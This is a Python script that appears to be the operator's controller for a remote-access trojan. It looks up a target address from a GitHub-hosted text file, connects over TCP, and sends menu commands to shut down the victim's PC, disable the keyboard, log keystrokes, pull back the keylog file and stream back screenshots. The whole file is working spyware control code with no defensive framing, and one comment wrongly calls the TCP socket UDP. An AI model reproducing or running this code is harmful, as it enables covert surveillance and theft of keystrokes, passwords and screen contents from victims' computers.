import socket
import os
    # Define the port to listen on (same as server's port)
listen_port = 6969
filename="keys.txt"
ifilename="scrn"
k=0
argt1=""
bdata=b""
    # Create a UDP socket
addr=os.popen("curl https://raw.githubusercontent.com/txt-sys/txt/refs/heads/main/ip.txt").read()
naddr=""
for n in addr:
        if n=='\n':
            break
        else:
            naddr+=n
print(naddr)
print("Input option\n1.Shutdown PC\n2.Switch off keyboard\n3.Keylog keypresses\n4.Retrieve txt file with presses\n5.Generate message on screen\n6.Screenshot(input time to take scrnsht and interval time)\nE:Close connection\n")
while True:
	argt1=""
	option=""
	k=0
	s=socket.socket()
	s.connect((naddr, listen_port))
	print("Ready")
	option=input()
	while True:
		c=option[0]
		s.send(option.encode())
		if c=='4':
			file = open('keys.txt', 'wb')
			line = s.recv(1024)
			while(line):
				file.write(line)
				line = s.recv(1024)
			print('File has been received successfully.')
			file.close()
			s.close()
			break
		elif c=='6':
			for n in option:
				if n==' ':
					k+=1
				if k==1:
					argt1+=n
				if k==2:
					break
			argtn1=int(argt1)
			for n in range(argtn1):
				ifilename="scrn"
				fnum=str(n)
				ifilename+=fnum
				ifilename+=".jpeg"
				fb=open(ifilename, "wb")
				data=s.recv(400)
				while data:
					sdata=str(data)
					pos=len(sdata)
					if sdata[pos-2]=='9'and sdata[pos-3]=='d' and sdata[pos-4]=='x'and sdata[pos-5]=='\\'and sdata[pos-6]=='f' and sdata[pos-7]=='f' and sdata[pos-8]=='x':
						fb.write(data)
						break
					fb.write(data)
					data=s.recv(400)
				print("Img saved")
				fb.close()
			s.close()
			break
		elif c=='E':
			s.close()
			exit()
		else:
			break

